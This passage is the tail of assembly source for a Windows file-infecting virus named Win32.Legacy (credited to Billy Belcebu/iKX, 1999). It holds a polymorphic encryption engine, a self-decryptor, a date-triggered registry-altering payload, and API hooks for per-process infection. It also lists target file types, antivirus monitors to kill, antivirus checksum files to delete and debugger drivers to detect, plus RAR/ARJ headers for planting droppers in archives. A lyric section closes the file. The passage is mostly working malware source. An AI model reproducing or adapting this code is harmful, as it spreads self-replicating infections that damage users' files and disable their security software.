	mov     bl,2                            ; INC reg_ptr
	call    @@gip_IncIt                     ; INC reg_ptr
	jmp     @@gip_@@2_EXIT
@@gip_@@3_@@2:
	mov     bl,2                            ; INC reg_ptr
	call    @@gip_IncIt                     ; INC reg_ptr

	call    @@gen_garbage

	mov     bl,2                            ; ADD reg_ptr,2
	call    @@gip_AddIt
	jmp     @@gip_@@2_EXIT

@@gip_@@4:
	mov     eax,2
	call    r_range
	xchg    eax,ecx
	jecxz   @@gip_@@4_@@2
@@gip_@@4_@@1:
	mov     bl,1                            ; ADD reg_ptr,1
	call    @@gip_AddIt                     ; INC reg_ptr

	call    @@gen_garbage

	mov     bl,3                            ; INC reg_ptr
	call    @@gip_IncIt                     ; INC reg_ptr
	jmp     @@gip_@@2_EXIT
@@gip_@@4_@@2:
	mov     bl,1                            ; INC reg_ptr
	call    @@gip_IncIt                     ; INC reg_ptr

	call    @@gen_garbage

	mov     bl,3                            ; INC reg_ptr
	call    @@gip_AddIt                     ; ADD reg_ptr,1
	jmp     @@gip_@@2_EXIT

@@gip_@@5:                                      ; INC reg_ptr
	mov     bl,4                            ; INC reg_ptr
	call    @@gip_IncIt                     ; INC reg_ptr
						; INC reg_ptr

@@gip_EXIT:
	or      word ptr [ebp+@@flags],_INCPOINTER
	ret

@@gip_AddIt:
	mov     al,83h
	stosb
	mov     al,byte ptr [ebp+@@reg_ptr2data]
	or      al,11000000b
	stosb
	mov     al,bl
	stosb
	ret

@@gip_IncIt:
	movzx   ecx,bl
	mov     al,40h
	add     al,byte ptr [ebp+@@reg_ptr2data]
@@gip_II_Loop:
	stosb
	push    ecx eax
	call    @@gen_garbage
	pop     eax ecx
	loop    @@gip_II_Loop
	ret

; Generate the code that will decrease in one unit the counter

@@gen_deccounter:
	mov     eax,3
	call    r_range
	xchg    eax,ecx
	jecxz   @@gdc_@@2
	dec     ecx
	jecxz   @@gdc_@@3
@@gdc_@@1:
	mov     al,83h                          ; SUB reg_size,1
	stosb
	mov     al,byte ptr [ebp+@@reg_counter]
	or      al,11101000b
	stosb
	mov     al,1
	stosb
	jmp     @@gdc_EXIT
@@gdc_@@2:
	mov     al,48h                          ; DEC reg_size
	add     al,byte ptr [ebp+@@reg_counter]
	stosb
	jmp     @@gdc_EXIT
@@gdc_@@3:
	mov     al,83h                          ; ADD reg_size,-1
	stosb
	mov     al,byte ptr [ebp+@@reg_counter]
	or      al,11000000b
	stosb
	mov     al,0FFh
	stosb
@@gdc_EXIT:
	or      word ptr [ebp+@@flags],_DECCOUNTER
	ret

; Generate the loop-alike thingy

@@gen_loop:
	mov     eax,04h
	call    r_range
	or      eax,eax
	jz      @@gl_@@3
	dec     eax
	jz      @@gl_@@2
	dec     eax
	jz      @@gl_@@1
@@gl_@@0:
	mov     al,83h                          ; CMP reg_size,00h
	stosb
	movzx   eax,byte ptr [ebp+@@reg_counter]
	or      al,11111000b
	stosb
	xor     eax,eax
	stosb
	jmp     @@gl_dojnz
@@gl_@@1:
	mov     al,83h                          ; CMP reg_size,-1
	stosb
	movzx   eax,byte ptr [ebp+@@reg_counter]
	or      al,11111000b
	stosb
	xor     eax,eax
	dec     eax
	stosb
	mov     eax,dword ptr [ebp+@@size_address]
	dec     dword ptr [eax]
	jmp     @@gl_dojnz
@@gl_@@2:
	mov     al,0Bh                          ; OR reg_size,reg_size
	stosb
	movzx   eax,byte ptr [ebp+@@reg_counter]
	shl     eax,3
	or      al,byte ptr [ebp+@@reg_counter]
	or      al,11000000b
	stosb       
	jmp     @@gl_dojnz
@@gl_@@3:
	mov     al,85h
	stosb
	movzx   eax,byte ptr [ebp+@@reg_counter] ; TEST reg_size,reg_size
	shl     eax,3
	or      al,byte ptr [ebp+@@reg_counter]
	or      al,11000000b
	stosb
	mov     eax,dword ptr [ebp+@@size_address]
	dec     dword ptr [eax]
@@gl_dojnz:
	mov     ax,850Fh                        ; JNZ LOOP_ADDRESS
	stosw
	mov     eax,dword ptr [ebp+@@l00paddress]
	sub     eax,edi
	sub     eax,00000004h
	stosd
	or      word ptr [ebp+@@flags],_LOOP
	ret

; --- Garbage generator's table

@@gbgtbl        label   byte
	dd      offset (@@do_anything)  ; Oh, my lazy engine! :)
	dd      offset (@@gen_arithmetic_reg32_reg32)
	dd      offset (@@gen_arithmetic_reg32_imm32)
	dd      offset (@@gen_arithmetic_eax_imm32)
	dd      offset (@@gen_mov_reg32_imm32)
	dd      offset (@@gen_mov_reg8_imm8)
	dd      offset (@@gen_call_to_subroutine)
	dd      offset (@@gen_push_garbage_pop)
	dd      offset (@@gen_zer0_reg)
	dd      offset (@@gen_arithmetic_reg32_reg32)
	dd      offset (@@gen_arithmetic_reg32_imm32)
	dd      offset (@@gen_arithmetic_eax_imm32)
	dd      offset (@@gen_mov_reg32_imm32)
	dd      offset (@@gen_mov_reg8_imm8)
@@non_mmx_gbg   equ     (($-offset @@gbgtbl)/4)
; MMX Garbage generatorz
	dd      offset (@@gen_onebyter) ; For security, it's here
	dd      offset (@@gen_mmx_group1)
	dd      offset (@@gen_mmx_group2)
	dd      offset (@@gen_mmx_group3)
	dd      offset (@@gen_mmx_movq_mm?_mm?)
	dd      offset (@@gen_mmx_movd_mm?_reg32)
@@s_gbgtbl      equ     (($-offset @@gbgtbl)/4)

; MMX version

@@after_looptbl label   byte
	dd      offset (@@gen_passptr2mmx)        ;\
	dd      offset (@@gen_crypt_instructions) ; >- Must follow this order
	dd      offset (@@gen_passmmx2ptr)        ;/
	dd      offset (@@gen_incpointer_deccounter)
	dd      offset (@@gen_loop)
@@s_aftlooptbl  equ     (($-offset @@after_looptbl)/4)

; Non MMX version

@@after_l00ptbl label   byte
	dd      offset (@@gen_non_mmx_crypt_instructions)
	dd      offset (@@gen_incpointer_deccounter)
	dd      offset (@@gen_loop)
@@s_aftl00ptbl  equ     (($-offset @@after_l00ptbl)/4)

mmxe_end        label   byte
mmxe            endp

; =:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=
; Random procedures 
; =:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=:=
;
; RANDOM
;
; input:
;       Nothing.
; output:
;       EAX = Random number
;

random          proc                            ; Thanx MDriller! ;)
	push    ecx
	mov     eax,dword ptr [ebp+rnd_seed1]
	dec     dword ptr [ebp+rnd_seed1]
	xor     eax,dword ptr [ebp+rnd_seed2]
	mov     ecx,eax
	rol     dword ptr [ebp+rnd_seed1],cl
	add     dword ptr [ebp+rnd_seed2],eax
	adc     eax,dword ptr [ebp+rnd_seed2]
	add     eax,ecx
	ror     eax,cl
	not     eax
	sub     eax,3
	xor     dword ptr [ebp+rnd_seed2],eax
	xor     eax,dword ptr [ebp+rnd_seed3]
	rol     dword ptr [ebp+rnd_seed3],1
	sub     dword ptr [ebp+rnd_seed3],ecx
	sbb     dword ptr [ebp+rnd_seed3],4
	inc     dword ptr [ebp+rnd_seed2]
	pop     ecx
	ret
random          endp

; R_RANGE
;
; input:
;       EAX = Number of possible random numbers
; output:
;       EAX = Number between 0 and (EAX-1)

r_range         proc
	push    ecx
	push    edx
	mov     ecx,eax
	call    random
	xor     edx,edx
	div     ecx
	mov     eax,edx
	pop     edx
	pop     ecx
	ret
r_range         endp

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Dropper unpacker (22 bytes)                                            ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;
; Even more optimized version of the one in Win32.Thorin!
;
; ???     ??????? ??????? ??????? 
; ? ?     ? ????? ? ????? ? ????? The Little and Shitty Compression Engine
; ? ????? ????? ? ? ????? ? ????? Poorly coded and written by...
; ??????? ??????? ??????? ??????? Who cares? :) Well... by me. Any problem?
;
; This is a very simple packing engine, based in the repetition of zeros that
; the PE  files have, thus it is  able to compress a PE file... Hehehe, i can
; put a dropper without caring about  its space! That was  the only reason of
; make this little shit. Maybe one day i will make a 'real' compression engi-
; ne, but today i'm too busy :)
;
; input:
;        EDI = Offset where unpack
;        ESI = Data to unpack
;        ECX = Size of packed data
; output:
;        Nothing.
;

LSCE_UnPack     proc
	lodsb                                   ; 1 byte        Whoa! I've
	or      al,al                           ; 2 bytes       optimized some
	jnz     store_byte                      ; 2 bytes       more bytes,
	dec     ecx                             ; 1 byte        and Super only
	dec     ecx                             ; 1 byte        helped me with
	lodsw                                   ; 2 bytes       one! I've done
	cwde                                    ; 1 byte        the rest! :)
	push    ecx                             ; 1 byte
	xor     ecx,ecx                         ; 2 bytes
	xchg    eax,ecx                         ; 1 byte
	rep     stosb                           ; 2 bytes
	pop     ecx                             ; 1 byte
	test    al,00h                          ; 1 byte
	org     $-1
store_byte:
	stosb                                   ; 1 byte
	loop    LSCE_UnPack                     ; 2 bytes
	ret                                     ; 1 bytes
LSCE_UnPack     endp

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| [iENC] - Internal ENCryptor engine v1.00                               ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;
; iENC_encrypt
;
; input:
;       ESI = Pointer to iENC structure
;       EDI = Pointer to where virus will be appended
; output:
;       Nothing
;

iENC_encrypt    proc
	lodsw
	cwde

	xchg    eax,ecx

	lodsw
	cwde

	add     eax,edi

	xchg    eax,edx

	call    random

iENC_encl00p:
	xor     byte ptr [edx],al
	inc     edx
	loop    iENC_encl00p

	cmp     byte ptr [esi],Billy_Bel
	jnz     iENC_encrypt

	ret
iENC_encrypt    endp

	db      00h,"[iENC v1.00]",00h

; iENC_decrypt
;
; input:
;       Nothing.
; output:
;       Nothing.
;

iENC_decrypt    proc
	pushad                                  ; Save all registers
	pushfd                                  ; Save flags

	mov     eax,[esp+24h]                   ; EAX = Return address
	mov     ebx,[eax]                       ; EBX = CRC32
	mov     ecx,[eax+04h]                   ; EAX = Size of block
	add     eax,08h                         ; EAX = Ptr to block

	cdq                                     ; EDX = 0
iENC_l00p:
	pushad                                  ; Preserve all registers
	push    eax ecx
iENC_subl00p:
	xor     byte ptr [eax],dl               ; XOR a byte
	inc     eax                             ; Point to next one
	loop    iENC_subl00p                    ; And try it too
	pop     edi esi
	call    CRC32                           ; Do the CRC's match?
	cmp     eax,ebx
	popad
	jz      iENC_Ok                         ; If so, all is ok.
	pushad
iENC_subl00p2:
	xor     byte ptr [eax],dl               ; Reencrypt: doesn't match
	inc     eax
	loop    iENC_subl00p2       
	popad
	inc     edx                             ; Try with another key
	jmp     iENC_l00p

iENC_Ok:
	popfd                                   ; Restore flags
	popad                                   ; Restore registers
	add     dword ptr [esp],08h             ; Fix return address
	ret                                     ; Pffff!
iENC_decrypt    endp

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Virus payload                                                          ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

payload         proc

	call    iENC_decrypt
	dd      00000000h
	dd      eBlock13-Block13

Block13 label   byte

	lea     eax,[ebp+SYSTEMTIME]            ; Get day, month, etc
	push    eax
	apicall _GetSystemTime

	cmp     word ptr [ebp+ST_wMonth],nMonth ; Is July?
	jnz     no_payload
						 
	cmp     word ptr [ebp+ST_wDay],nDay     ; Is 31?
	jnz     no_payload

	push    00001000h                       ; Kewl! Show copyrightz msgs
	lea     ebx,[ebp+szTtl]
	push    ebx
	lea     ebx,[ebp+szMsg]
	push    ebx
	push    00000000h
	apicall _MessageBoxA

	lea     eax,[ebp+Disposition]           ; Make a little trick for the
	push    eax                             ; Explorer...
	lea     eax,[ebp+RegHandle]
	push    eax
	xor     eax,eax
	push    eax
	push    000F003Fh
	push    eax
	push    eax
	push    eax
	pushs   "Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"
	push    80000001h
	apicall _RegCreateKeyExA

	push    13d
	call    over_ttl
szTtl   db      "[Win32.Legacy."
	IF      DEBUG
	db      "debug."
	ENDIF
	vsize
	db      " v1.00]",0
over_ttl:
	push    01h
	push    00h
	pushs   "DisplayName"
	push    dword ptr [ebp+RegHandle]
	apicall _RegSetValueExA

	push    dword ptr [ebp+RegHandle]
	apicall _CloseHandle
no_payload:
	ret
payload         endp

szMsg   db      "Welcolme to the Win32.Legacy payload. You are infected by a virus,",10
	db      "i am your worst nightmare... But BEWARE! Your organism is also ",10
	db      "infected. So go to the doctor and ask him for a cure for this...",10,10
	; Since here, the message is a bullshit :)
	db      "Featuring:",10
	db      09,"MultiMedia eXtensions Engine [MMXE v1.01]",10
	db      09,"Polymorphic Header Idiot Random Engine [PHIRE v1.00]",10
	db      09,"Internal ENCryptor technology [iENC v1.00]",10
	db      10,"Greetings:",10
	db      09,"StarZer0/iKX & Int13h -> Thanx for information about archives",10
	db      09,"Murkry/iKX -> Thanx for 'Win95 Structures & Secrets' article",10
	db      09,"zAxOn/DDT -> Thanx for getting me into ASM",10
	db      09,"Benny/29A -> Thanx for information about threads",10
	db      09,"The Mental Driller/29A -> Thanx for polymorphy ideas",10
	db      09,"Super/29A -> Thanx for optimization knowledge & opcode list",10
	db      09,"Wintermute -> Thanx for emulation ideas",10
	db      09,"Ypsilon -> Thanx for NT information & cool ideas",10
	db      10,"I don't like the drugs...",10
	db      09,"But the drugs like me!",10,10
	db      "(c) 1999 Billy Belcebu/iKX",09,09,"< billy_belcebu@mixmail.com >",0

eBlock13 label  byte

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Data                                                                   ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

		IF      DEBUG
SEARCH_MASK             db      "GOAT???."
		ELSE
SEARCH_MASK             db      "*."
		ENDIF

EXTENSION               dd      00000000h

Extensions_Table        label   byte
			db      "EXE",0
			db      "SCR",0
			db      "CPL",0
			db      "RAR",0
			db      "ARJ",0
nExtensions             equ     (($-offset Extensions_Table)/4)

ThreadsTable            label   byte
			dd      offset (ThrKillMonitors)
			dd      offset (ThrAntiDebugger)
			dd      offset (ThrDeleteCRC)
			dd      offset (ThrPerProcess)
			dd      offset (ThrPrepareInf)
			dd      offset (ThrInfectFiles)
nThreads                equ     (($-offset ThreadsTable)/4)

Monitors2Kill           label   byte
			db      "AVP Monitor",0
			db      "Amon Antivirus Monitor",0
			db      Billy_Bel

Files2Kill              label   byte
			db      "ANTI-VIR.DAT",0
			db      "CHKLIST.DAT",0
			db      "CHKLIST.TAV",0
			db      "CHKLIST.MS",0
			db      "CHKLIST.CPS",0
			db      "AVP.CRC",0
			db      "IVB.NTZ",0
			db      "SMARTCHK.MS",0
			db      "SMARTCHK.CPS",0
			db      Billy_Bel

Drivers2Avoid           label   byte
			db      "\\.\SICE",0
			db      "\\.\NTICE",0
			db      Billy_Bel

; iENC structure
; ??????????????
;       +00h    Size of block
;       +02h    Offset of block - offset of virus start

iENC_struc              label   byte
			dw      offset (eBlock1-Block1)
			dw      offset (Block1-virus_start)

			dw      offset (eBlock2-Block2)
			dw      offset (Block2-virus_start)

			dw      offset (eBlock3-Block3)
			dw      offset (Block3-virus_start)

			dw      offset (eBlock4-Block4)
			dw      offset (Block4-virus_start)

			dw      offset (eBlock5-Block5)
			dw      offset (Block5-virus_start)

			dw      offset (eBlock6-Block6)
			dw      offset (Block6-virus_start)

			dw      offset (eBlock7-Block7)
			dw      offset (Block7-virus_start)

			dw      offset (eBlock8-Block8)
			dw      offset (Block8-virus_start)

			dw      offset (eBlock9-Block9)
			dw      offset (Block9-virus_start)

			dw      offset (eBlockA-BlockA)
			dw      offset (BlockA-virus_start)

			dw      offset (eBlockB-BlockB)
			dw      offset (BlockB-virus_start)

			dw      offset (eBlockC-BlockC)
			dw      offset (BlockC-virus_start)

			dw      offset (eBlockD-BlockD)
			dw      offset (BlockD-virus_start)

			dw      offset (eBlockE-BlockE)
			dw      offset (BlockE-virus_start)

			dw      offset (eBlockF-BlockF)
			dw      offset (BlockF-virus_start)

			dw      offset (eBlock10-Block10)
			dw      offset (Block10-virus_start)

			dw      offset (eBlock11-Block11)
			dw      offset (Block11-virus_start)

			dw      offset (eBlock12-Block12)
			dw      offset (Block12-virus_start)

			dw      offset (eBlock13-Block13)
			dw      offset (Block13-virus_start)

n_iENC_blocks           equ     (($-offset iENC_struc)/4)

			db      Billy_Bel

@@Hookz                 label   byte

; @@Hookz structure
; ?????????????????
;       +00h    API CRC32
;       +04h    Address of the new handler for that API
;       +08h    The address of the original API

			dd      02308923Fh
			dd      offset (HookMoveFileA)
hMoveFileA:             dd      000000000h

			dd      05BD05DB1h
			dd      offset (HookCopyFileA)
hCopyFileA:             dd      000000000h

			dd      08F48B20Dh
			dd      offset (HookGetFullPathNameA)
hGetFullPathNameA:      dd      000000000h

			dd      0DE256FDEh
			dd      offset (HookDeleteFileA)
hDeleteFileA:           dd      000000000h

			dd      028452C4Fh
			dd      offset (HookWinExec)
hWinExec:               dd      000000000h

			dd      0267E0B05h
			dd      offset (HookCreateProcessA)
hCreateProcessA:        dd      000000000h

			dd      08C892DDFh
			dd      offset (HookCreateFileA)
hCreateFileA:           dd      000000000h

			dd      0C633D3DEh
			dd      offset (HookGetFileAttributesA)
hGetFileAttributesA:    dd      000000000h

			dd      03C19E536h
			dd      offset (HookSetFileAttributesA)
hSetFileAttributesA:    dd      000000000h

			dd      0F2F886E3h
			dd      offset (Hook_lopen)
h_lopen:                dd      000000000h

			dd      03BE43958h
			dd      offset (HookMoveFileExA)
hMoveFileExA:           dd      000000000h

			dd      0953F2B64h
			dd      offset (HookCopyFileExA)
hCopyFileExA:           dd      000000000h

			dd      068D8FC46h
			dd      offset (HookOpenFile)
hOpenFile               dd      000000000h

			dd      0FFC97C1Fh
			dd      offset (HookGetProcAddress)
hGetProcAddress:        dd      000000000h

			dd      0AE17EBEFh
			dd      offset (HookFindFirstFileA)
hFindFirstFileA:        dd      000000000h

			dd      0AA700106h
			dd      offset (HookFindNextFileA)
hFindNextFileA:         dd      000000000h

nHookedAPIs             equ     ((($-offset @@Hookz)/4)/3)

			db      Billy_Bel

@@NamezCRC32            label   byte
@FindFirstFileA         dd      0AE17EBEFh
@FindNextFileA          dd      0AA700106h
@FindClose              dd      0C200BE21h
@CreateFileA            dd      08C892DDFh
@DeleteFileA            dd      0DE256FDEh
@SetFilePointer         dd      085859D42h
@SetFileAttributesA     dd      03C19E536h
@CloseHandle            dd      068624A9Dh
@GetCurrentDirectoryA   dd      0EBC6C18Bh
@SetCurrentDirectoryA   dd      0B2DBD7DCh
@GetWindowsDirectoryA   dd      0FE248274h
@GetSystemDirectoryA    dd      0593AE7CEh
@CreateFileMappingA     dd      096B2D96Ch
@MapViewOfFile          dd      0797B49ECh
@UnmapViewOfFile        dd      094524B42h
@SetEndOfFile           dd      059994ED6h
@GetProcAddress         dd      0FFC97C1Fh
@LoadLibraryA           dd      04134D1ADh
@GetSystemTime          dd      075B7EBE8h
@CreateThread           dd      019F33607h
@WaitForSingleObject    dd      0D4540229h
@ExitThread             dd      0058F9201h
@GetTickCount           dd      0613FD7BAh
@FreeLibrary            dd      0AFDF191Fh
@WriteFile              dd      021777793h
@GlobalAlloc            dd      083A353C3h
@GlobalFree             dd      05CDF6B6Ah
@GetFileSize            dd      0EF7D811Bh
@GetFileAttributesA     dd      0C633D3DEh
@ReadFile               dd      054D8615Ah
@GetCurrentProcess      dd      003690E66h
@GetPriorityClass       dd      0A7D0D775h
@SetPriorityClass       dd      0C38969C7h
			db      Billy_Bel
@FindWindowA            dd      085AB3323h
@PostMessageA           dd      086678A04h
@MessageBoxA            dd      0D8556CF7h
			db      Billy_Bel
@RegCreateKeyExA        dd      02C822198h
@RegSetValueExA         dd      05B9EC9C6h
			db      Billy_Bel

; --- RAR Header

RARHeader               label   byte
RARHeaderCRC            dw      0000h
RARType                 db      74h
RARFlags                dw      8000h
RARHeadsize             dw      sRARHeaderSize
RARCompressed           dd      00000000h
RAROriginal             dd      00000000h
RAROs                   db      00h
RARCrc32                dd      00000000h
RARFileTime             dw      archive_mark
RARFileDate             db      31h,24h
RARNeedVer              db      14h
RARMethod               db      30h
RARFnameSize            dw      sRARNameSize
RARAttrib               dd      00000000h
RARName                 db      "LEGACY.EXE"
sRARHeaderSize          equ     ($-offset RARHeader)
sRARNameSize            equ     ($-offset RARName)

; --- ARJ Header

ARJHeader               label   byte
ARJSig                  db      60h,0EAh
ARJHeadsiz              dw      2Ah
ARJHSmsize              db      1Eh
ARJVer                  db      07h
ARJMin                  db      01h
ARJHost                 db      00h
ARJFlags                db      10h
ARJMethod               db      00h
ARJFiletype             db      00h
ARJReserved             db      "Z"
ARJFileTime             dw      archive_mark
ARJFileDate             db      031h,024h
ARJCompress             dd      00000000h
ARJOriginal             dd      00000000h
ARJCRC32                dd      00000000h
ARJEntryName            dw      0000h
ARJAttribute            dw      0000h
ARJHostData             dw      0000h

sARJHeader              equ     ($-offset ARJHeader)

ARJSecondSide           label   byte
ARJFilename             db      "LEGACY.EXE",0
ARJComment              db      00h
sARJCRC32Size           equ     ($-offset ARJHSmsize)
ARJHeaderCRC            dd      00000000h
ARJExtended             dw      0000h

sARJSecondSide          equ     ($-offset ARJSecondSide)
sARJTotalSize           equ     ($-offset ARJSig)

ArchiveBuffer           db      50d dup (00h)

OldBytes                db      pLIMIT dup (00h)
NewBytes                db      pLIMIT dup (00h)

K32_DLL                 db      "KERNEL32.dll",0
K32_Size                equ     ($-offset K32_DLL)

kernel                  dd      00000000h
user32                  dd      00000000h
TmpModuleBase           dd      00000000h
TempGA_IT1              dd      00000000h
imagebase               equ     ModBase
TempGA_IT2              dd      00000000h
infections              dd      00000000h
iobytes                 dd      02h dup (00h)
NewSize                 dd      00000000h
InfDropperSize          dd      00000000h
ArchiveSize             dd      00000000h
NumBytesRead            dd      00000000h
SearchHandle            dd      00000000h
FileHandle              dd      00000000h
RegHandle               dd      00000000h
GlobalAllocHandle       dd      00000000h
GlobalAllocHandle2      dd      00000000h
GlobalAllocHandle3      dd      00000000h
MapHandle               dd      00000000h
MapAddress              dd      00000000h
AddressTableVA          dd      00000000h
NameTableVA             dd      00000000h
OrdinalTableVA          dd      00000000h
lpThreadId              dd      00000000h
Disposition             dd      00000000h
WFD_HndInMem            dd      00000000h
Counter                 dw      0000h
WFD_Handles_Count       db      00h
SoftICE                 db      00h

; --- MMXE data

random_seed             label   byte
rnd_seed1               dd      00000000h
rnd_seed2               dd      00000000h
rnd_seed3               dd      00000000h
			dd      00000000h

; Registers used (MMXE & PHIRE)

@@reg_mask              db      00h
@@reg_key               db      00h
@@reg_counter           db      00h

@@reg_ptr2data          db      00h
@@reg_aux1              equ     $-1
@@reg_delta             db      00h
@@reg_aux2              equ     $-1

@@mmx_ptr2data          db      00h
@@mmx_key               db      00h

@@init_mmx?             db      00h

@@ptr_data2enc          dd      00000000h
@@ptr_buffer            dd      00000000h
@@size2enc              dd      00000000h
@@size2cryptd4          dd      00000000h
@@tmp_call              dd      00000000h
@@p_tmp_call            equ     $-4
@@fix1                  dd      00000000h
@@fix2                  dd      00000000h
@@enc_key               dd      00000000h
@@l00paddress           dd      00000000h
@@size_address          dd      00000000h
@@ptrto2nd              dd      00000000h
@@flags                 dw      0000h
@@recursion             db      00h

; --- PHIRE data

@@p_distance            dd      00000000h
@@p_buffer              dd      00000000h

; --- More virus data

@@Offsetz               label   byte
_FindFirstFileA         dd      00000000h
_FindNextFileA          dd      00000000h
_FindClose              dd      00000000h
_CreateFileA            dd      00000000h
_DeleteFileA            dd      00000000h
_SetFilePointer         dd      00000000h
_SetFileAttributesA     dd      00000000h
_CloseHandle            dd      00000000h
_GetCurrentDirectoryA   dd      00000000h
_SetCurrentDirectoryA   dd      00000000h
_GetWindowsDirectoryA   dd      00000000h
_GetSystemDirectoryA    dd      00000000h
_CreateFileMappingA     dd      00000000h
_MapViewOfFile          dd      00000000h
_UnmapViewOfFile        dd      00000000h
_SetEndOfFile           dd      00000000h
_GetProcAddress         dd      00000000h
_LoadLibraryA           dd      00000000h
_GetSystemTime          dd      00000000h
_CreateThread           dd      00000000h
_WaitForSingleObject    dd      00000000h
_ExitThread             dd      00000000h
_GetTickCount           dd      00000000h
_FreeLibrary            dd      00000000h
_WriteFile              dd      00000000h
_GlobalAlloc            dd      00000000h
_GlobalFree             dd      00000000h
_GetFileSize            dd      00000000h
_GetFileAttributesA     dd      00000000h
_ReadFile               dd      00000000h
_GetCurrentProcess      dd      00000000h
_GetPriorityClass       dd      00000000h
_SetPriorityClass       dd      00000000h

@@OffsetzUSER32         label   byte
_FindWindowA            dd      00000000h
_PostMessageA           dd      00000000h
_MessageBoxA            dd      00000000h

@@OffsetzADVAPI32       label   byte
_RegCreateKeyExA        dd      00000000h
_RegSetValueExA         dd      00000000h

MAX_PATH                equ     260

FILETIME                STRUC
FT_dwLowDateTime        dd      ?
FT_dwHighDateTime       dd      ?
FILETIME                ENDS

WIN32_FIND_DATA         label   byte
WFD_dwFileAttributes    dd      ?
WFD_ftCreationTime      FILETIME ?
WFD_ftLastAccessTime    FILETIME ?
WFD_ftLastWriteTime     FILETIME ?
WFD_nFileSizeHigh       dd      ?
WFD_nFileSizeLow        dd      ?
WFD_dwReserved0         dd      ?
WFD_dwReserved1         dd      ?
WFD_szFileName          db      MAX_PATH dup (?)
WFD_szAlternateFileName db      13 dup (?)
			db      03 dup (?)

TMP_szFileName          db      MAX_PATH dup (?)

directories             label   byte

WindowsDir              db      7Fh dup (00h)
SystemDir               db      7Fh dup (00h)
OriginDir               db      7Fh dup (00h)
dirs2inf                equ     (($-directories)/7Fh)
mirrormirror            db      dirs2inf

SYSTEMTIME              label   byte
ST_wYear                dw      ?
ST_wMonth               dw      ?
ST_wDayOfWeek           dw      ?
ST_wDay                 dw      ?
ST_wHour                dw      ?
ST_wMinute              dw      ?
ST_wSecond              dw      ?
ST_wMilliseconds        dw      ?

		align   dword

virus_end       label   byte

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| 1st generation host                                                    ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;
; Nadie combate la libertad. A lo m s, combate la libertad de los dem s. La
; libertad ha existido siempre, pero unas veces como privilegio de algunos,
; otras veces como derecho de todos. (Karl Marx)

fakehost:
	pop     dword ptr fs:[0]
	pop     eax
	popad
	popad

	push    00h                             ; Hiya Vecna! Cocaine rules!
	push    offset szMessage                ; Even its 1st gen host! ;)
	IF      DEBUG
	pushs   "Win32.Legacy.debug#Legacy [debug mode] v1.00"
	ELSE
	pushs   "Win32.Legacy#Legacy v1.00"
	ENDIF
	push    00h
	call    ShellAboutA

	push    00h
	call    ExitProcess

end     legacy1

; ===========================================================================
; || Bonus track                                                           ||
; ===========================================================================
;
; As this virus is my  favourite one, i will put  here  my favourite  song :)
; It's a song from the last album of Blind Guardian (www.blind-guardian.com),
; based  in  the book  The  Silmarillion (J.R.R. Tolkien). The  album (called
; "Nightfall in  the  Middle-Earth"), is the  most complete (and probably the
; best one) of Blind  Guardian. Even the mixers  of the album are very famous
; in the  metal world: Flemming Rasmussen (see other B.G. albums as "Imagina-
; tions from the other side", also Metallica's "...And Justice For All", etc)
; Piet Sielck (some songs of B.G. version's album "The forgotten tales", also
; vocalist/producer of his parallel project Iron Savior (albums "Iron Savior"
; and "Unification"), and  produced  also other  bands  as GammaRay, etc) and
; Charlie Bauerfeind. Well, here comes the song.
;
; - Mirror Mirror -
;
; Far, far beyond the island
; We dwelt the shades of twilight
; Through dread and weary days
; Through grief and endless pain
;
; It lies unknown
; The land of mine
; A hidden gate
; To save us from the shadow fall
;
; The lord of water spoke
; In the silence
; Words of wisdom
; I've seen the end of all
; Be aware, the storm gets closer
;
; chorus:
; Mirror Mirror on the wall
: True hope lies beyond the coast
; You're a damned kind can't you see
; That the winds will change
; Mirror Mirror on the wall
: True hope lies beyond the coast
; You're a damned kind can't you see
; That tomorrow bears insanity
;
; Gone's the wisdom
; Of a thousand years
; A world in fire and chains and fear
; Leads me to a place so far
; Deep down it lies my secret vision
; I better keep it safe
;
; Sall i leave my frinds alone
; Hidden in my twilight hall
; (I) know the world is lost in fire
; Sure there is no way to turn it
; Back to the old days
; Of bliss and cheerful laughter
; We're lost in barren lands
; Caught in the running flames
; Alone
;
; How shall we leave the lost road
; Time's getting short so follow me
; A leader's task so clearly
; To find a path out of the dark
;
; (chorus)
;
; Even though
; The storm calmed down
; The bitter end
; Is just a matter of time
;
; Shall we dare the dragon
; Mercyless he's poisoning our hearts
; Our hearts
;
; How...
; (chorus)
; 
; ---
; Copyright (c) 1998 by Blind Guardian; "Nightfall in the Middle-Earth" album
;



 



